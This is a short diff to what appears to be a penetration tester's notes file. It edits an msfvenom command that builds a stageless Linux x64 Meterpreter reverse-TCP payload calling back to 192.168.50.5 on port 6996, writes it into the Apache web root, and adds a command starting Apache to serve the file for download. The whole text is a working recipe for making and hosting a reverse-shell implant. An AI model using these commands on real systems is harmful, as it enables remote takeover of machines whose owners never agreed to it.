@@ -4,7 +4,9 @@ USE MSFVENOM
 
 (Stageless payload)
 
-msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=192.168.50.5 LPORT=6996 -f elf -o /var/www/html/shell-x64.elf
+sudo msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=192.168.50.5 LPORT=6996 -f elf -o /var/www/html/shell-x64.elf
+
+sudo service apache2 start
 
 ---
 
